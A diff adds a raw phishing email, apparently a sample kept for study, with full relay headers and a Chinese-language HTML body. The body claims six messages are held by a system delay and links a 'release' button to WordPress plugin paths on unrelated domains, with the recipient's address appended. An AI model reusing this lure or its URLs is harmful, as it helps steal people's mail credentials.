@@ -1,0 +1,145 @@
+Received: from smtp.foton.com.cn (unknown [60.247.11.228])
+	by app3 (Coremail) with SMTP id EDAi0gCnJcB4+v1fcBq+AA--.52013S3;
+	Wed, 13 Jan 2021 03:37:28 +0800 (CST)
+Received: from smtpfoton.foton.com.cn (unknown [172.24.221.130])
+	by Websense Email Security Gateway with ESMTP id 447973456F583
+	for <shengen.fang@test.com>; Wed, 13 Jan 2021 11:43:18 +0800 (CST)
+Received: from smtp.foton.com.cn ([192.168.15.10])
+          by smtp1.foton.com.cn (IBM Domino Release 9.0.1FP10 HF66)
+          with ESMTP id 2021011311445169-2142663 ;
+          Wed, 13 Jan 2021 11:44:51 +0800
+Received: from foton.com.cn (unknown [115.227.50.5])
+	(using TLSv1.2 with cipher DHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+	(No client certificate requested)
+	by Forcepoint Email with ESMTPSA id EAE56F92513FE7095E0E
+	for <shengen.fang@test.com>; Wed, 13 Jan 2021 11:13:06 +0800 (CST)
+From: test.com  <liguangfu2@foton.com.cn>
+To: shengen.fang@test.com
+Subject: 
+ =?UTF-8?B?5biQ5oi35o+Q6YaSOiDnq4vljbPmo4Dmn6XmgqjnmoTpgq7nrrEg?=shengen.fang@test.com=?UTF-8?B?4oSi?=
+Date: 13 Jan 2021 04:43:22 +0100
+Message-ID: <20210113044321.19FDB6021AA90541@foton.com.cn>
+MIME-Version: 1.0
+X-MIMETrack: Itemize by SMTP Server on smtp1/foton(Release 9.0.1FP10
+ HF66|February 09, 2018) at
+ 2021/01/13 11:44:51,
+	Serialize by Router on smtp/foton(Release 9.0.1FP10 HF66|February 09,
+ 2018) at
+ 2021/01/13 11:44:41,
+	Serialize complete at 2021/01/13 11:44:41
+X-TNEFEvaluated: 1
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/html;
+	charset="iso-8859-1"
+X-CM-TRANSID: EDAi0gCnJcB4+v1fcBq+AA--.52013S3
+Authentication-Results: app3; spf=pass smtp.mail=liguangfu2@foton.com.
+	cn;
+X-Coremail-Antispam: 1UD129KBjDUn29KB7ZKAUJUUUUU529EdanIXcx71UUUUU7v73
+	VFW2AGmfu7bjvjm3AaLaJ3UjIYCTnIWjp_UUUOF7k0a2IF6r1xM7kC6x804xWl14x267AK
+	xVWUJVW8JwAFIxvE14AKwVWUJVWUGwA2jI8I6cxK62vIxIIY0VWUZVW8XwA2ocxC64kIII
+	0Yj41l84x0c7CEw4AK67xGY2AK021l84ACjcxK6xIIjxv20xvE14v26r1j6r1xM28EF7xv
+	wVC0I7IYx2IY6xkF7I0E14v26r1j6r4UM28EF7xvwVC2z280aVAFwI0_Jr0_Gr1l84ACjc
+	xK6I8E87Iv6xkF7I0E14v26r1j6r4UM2AIxVAIcxkEcVAq07x20xvEncxIr21l5I8CrVAa
+	z4v267kvewAqx4xG6I80eVAI3cIFxVC2b4A2awAv7VC0I7IYx2IY67AKxVWUJVWUGwAv7V
+	C2z280aVAFwI0_Jr0_Gr1lOx8S6xCaFVCjc4AY6r1j6r4UM4x0Y48IcVAKI48JM4xvF2IE
+	5I8CrVAEw40kM4kE6x8GjcxK67AEwI8IwI0ExsIj0wCjxxvEa2IrMxkIecxEwVAFwVWrMx
+	kI7II2jI8vz4vEwIxGrwCYIxAIcVC0I7IYx2IY67AKxVWUJVWUCwCYIxAIcVC0I7IYx2IY
+	6xkF7I0E14v26r1j6r4UMxvI42IY6I8E87Iv67AKxVWUJVW8JwCYIxAIcVC2z280aVCY1x
+	0267AKxVWUJVW8JwCF04k20xvY0x0EwIxGrwCF72vE77IF4wCFx2IqxVCFs4IE7xkEbVWU
+	JVW8JwC20s026c02F40E14v26r106r1rMI8I3I0E7480Y4vE14v26r1j6r18MI8E67AF67
+	kF1VAFwI0_Jr0_JrylIxkGc2Ij64vIr41lIxAIcVCF04k26cxKx2IYs7xG6rWUJVWrZr1U
+	YxBIdaVFxhVjvjDU0xZFpf9x07UZa93UUUUU=
+
+<HTML><HEAD>
+<META=20name=3DGENERATOR=20content=3D"MSHTML=2011.00.10570.1001"></HEAD>
+=
+
+<body>
+<P>
+<table=20style=3D"FONT-SIZE:=2015px;=20FONT-FAMILY:=20arial,verdana,sans-=
+serif;=20WIDTH:=20600px;=20BORDER-COLLAPSE:=20collapse;=20TABLE-LAYOUT:=20=
+fixed;=20COLOR:=20rgb(33,33,33);=20PADDING-BOTTOM:=200px;=20PADDING-TOP:=20=
+0px;=20PADDING-LEFT:=200px;=20BORDER-SPACING:=200px;=20MARGIN:=200px;=20P=
+ADDING-RIGHT:=200px"=20cellspacing=3D"0"=20cellpadding=3D"0"=20border=3D"=
+0">
+<TBODY>
+<TR>
+<td=20style=3D"FONT-SIZE:=2026px;=20FONT-FAMILY:=20&quot;FreightSans=20Pr=
+o&quot;,&quot;Segoe=20UI&quot;,&quot;SanFrancisco=20Display&quot;,Arial,s=
+ans-serif;=20WIDTH:=20440px;=20PADDING-BOTTOM:=200px;=20PADDING-TOP:=2060=
+px;=20PADDING-LEFT:=2080px;=20LINE-HEIGHT:=2030px;=20PADDING-RIGHT:=2080p=
+x"=20valign=3D"top"=20align=3D"center"><FONT=20color=3D#3d85c6>&#36890;&#=
+30693;</FONT><BR></TD></TR>
+<TR>
+<td=20style=3D"FONT-FAMILY:=20&quot;Fakt=20Pro&quot;,&quot;Segoe=20UI&quo=
+t;,&quot;SanFrancisco=20Display&quot;,Arial,sans-serif;=20WIDTH:=20440px;=
+=20COLOR:=20rgb(106,109,112);=20PADDING-BOTTOM:=200px;=20PADDING-TOP:=202=
+0px;=20PADDING-LEFT:=2080px;=20LINE-HEIGHT:=2023px;=20PADDING-RIGHT:=2080=
+px"=20valign=3D"top"=20align=3D"center">
+&#24744;&#22312;&#65288;Jan-13-2021&#65289;&#19978;&#26377;6&#26465;&#244=
+53;&#22788;&#29702;&#37038;&#20214;.=20&#36825;&#26159;&#30001;&#20110;&#=
+31995;&#32479;&#24310;&#36831;&#24341;&#36215;&#30340;.=20&#36825;&#26159=
+;&#30001;&#20110;&#31995;&#32479;&#24310;&#36831;&#24341;&#36215;&#30340;=
+</TD></TR>
+<TR>
+<td=20style=3D"WIDTH:=20280px;=20PADDING-BOTTOM:=200px;=20PADDING-TOP:=20=
+40px;=20PADDING-LEFT:=20160px;=20LINE-HEIGHT:=201.666;=20PADDING-RIGHT:=20=
+160px"=20valign=3D"top"=20align=3D"left">
+<table=20style=3D"WIDTH:=20280px;=20BORDER-COLLAPSE:=20collapse;=20TABLE-=
+LAYOUT:=20fixed;=20PADDING-BOTTOM:=200px;=20PADDING-TOP:=200px;=20PADDING=
+-LEFT:=200px;=20BORDER-SPACING:=200px;=20MARGIN:=200px;=20PADDING-RIGHT:=20=
+0px"=20cellspacing=3D"0"=20cellpadding=3D"0"=20border=3D"0">
+<TBODY>
+<TR>
+<td=20style=3D"FONT-FAMILY:=20arial,verdana,sans-serif;=20WIDTH:=20280px;=
+=20PADDING-BOTTOM:=200px;=20PADDING-TOP:=200px;=20PADDING-LEFT:=200px;=20=
+LINE-HEIGHT:=201.666;=20PADDING-RIGHT:=200px"=20valign=3D"top"=20align=3D=
+"left">
+<A=20id=3Dm_4756561952172460999m_-6961601685091934187gmail-m_-64764810600=
+85870456m_7310088314140387167m_8294260222782725602gmail-m_903683770522445=
+2887gmail-m_7360826394100554531m_5877079487823585394m_-849044671659553152=
+4gmail-m_698738018328119430m_6046871666111347109gmail-m_20214942486668086=
+32LPlnk998967=20style=3D'FONT-FAMILY:=20"Fakt=20Pro=20Medium","Segoe=20UI=
+","SanFrancisco=20Display",Arial,sans-serif;=20COLOR:=20rgb(255,255,255);=
+=20PADDING-BOTTOM:=2015px;=20TEXT-ALIGN:=20center;=20PADDING-TOP:=2015px;=
+=20PADDING-LEFT:=2020px;=20
+DISPLAY:=20block;=20PADDING-RIGHT:=2020px;=20BACKGROUND-COLOR:=20rgb(64,1=
+59,255);=20border-radius:=2025px'=20href=3D"https://www.fantasieaifornell=
+i.it/wp-content/plugins/eng/?x=3Dx&amp;a=3Dshengen.fang@test.com"=20rel=
+=3D"noopener=20noreferrer"=20target=3D_blank=20data-saferedirecturl=3D"ht=
+tps://www.google.com/url?q=3Dhttp://dram.testmticket.in.ua/wp-content/plu=
+gins/bankz/?x%3Dx%26a%3D%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D=
+1610509700438000&amp;usg=3DAFQjCNGUPmynJJjq1knKBBweODFzB-Fpbg">
+&#21457;&#24067;&#24310;&#36831;&#30340;&#28040;&#24687;</A></TD></TR></T=
+BODY></TABLE>
+<P=20style=3D'FONT-SIZE:=2013px;=20FONT-FAMILY:=20"Helvetica=20Neue",Helv=
+etica,Arial,sans-serif;=20COLOR:=20rgb(38,40,42)'><SPAN=20style=3D"FONT-S=
+IZE:=2012pt;=20FONT-FAMILY:=20corbel,serif,emojifont;=20COLOR:=20rgb(69,6=
+9,69)"><SPAN=20style=3D"FONT-SIZE:=20xx-small;=20VERTICAL-ALIGN:=20inheri=
+t"><SPAN=20style=3D"VERTICAL-ALIGN:=20inherit"><SPAN=20style=3D"VERTICAL-=
+ALIGN:=20inherit"><SPAN=20style=3D"VERTICAL-ALIGN:=20inherit"><FONT=20siz=
+e=3D3><BR></FONT></SPAN></SPAN></SPAN></SPAN></SPAN></P>
+<P=20style=3D'FONT-SIZE:=2013px;=20FONT-FAMILY:=20"Helvetica=20Neue",Helv=
+etica,Arial,sans-serif;=20COLOR:=20rgb(38,40,42);=20TEXT-ALIGN:=20center'=
+><SPAN=20style=3D"FONT-SIZE:=2015px;=20FONT-FAMILY:=20Roboto,RobotoDraft,=
+Helvetica,Arial,sans-serif;=20COLOR:=20rgb(33,33,33)">&#35874;&#35874;</S=
+PAN><FONT=20size=3D4><SPAN=20style=3D"FONT-SIZE:=20medium;=20FONT-FAMILY:=
+=20corbel,serif,emojifont;=20COLOR:=20rgb(69,69,69)">,</SPAN><BR></FONT><=
+/P>
+<P=20style=3D'FONT-SIZE:=2013px;=20FONT-FAMILY:=20"Helvetica=20Neue",Helv=
+etica,Arial,sans-serif;=20COLOR:=20rgb(38,40,42);=20TEXT-ALIGN:=20center'=
+><SPAN=20style=3D"FONT-SIZE:=2012pt;=20FONT-FAMILY:=20corbel,serif,emojif=
+ont;=20COLOR:=20rgb(69,69,69)">E-Mail&#8482;=20&copy;=202021&nbsp;</SPAN>=
+&#37038;&#20214;<SPAN=20style=3D"FONT-SIZE:=2012pt;=20FONT-FAMILY:=20corb=
+el,serif,emojifont;=20COLOR:=20rgb(69,69,69)">&nbsp;</SPAN>&#29256;&#2643=
+5;&#25152;&#26377;<SPAN=20style=3D"FONT-SIZE:=2012pt;=20FONT-FAMILY:=20co=
+rbel,serif,emojifont;=20COLOR:=20rgb(69,69,69)">
+.</SPAN><SPAN=20style=3D"FONT-SIZE:=2015px;=20FONT-FAMILY:=20Roboto,Robot=
+oDraft,Helvetica,Arial,sans-serif;=20COLOR:=20rgb(33,33,33)">&#22312;&#32=
+447;&#32593;&#32476;&#37038;&#20214;</SPAN></P></TD></TR></TBODY></TABLE>=
+</P>
+<br><pre><font=20color=3D"blue">
+This=20message=20has=20been=20scanned=20and=20no=20issues=20discovered.
+
+</font></pre><br>
+</BODY></HTML>
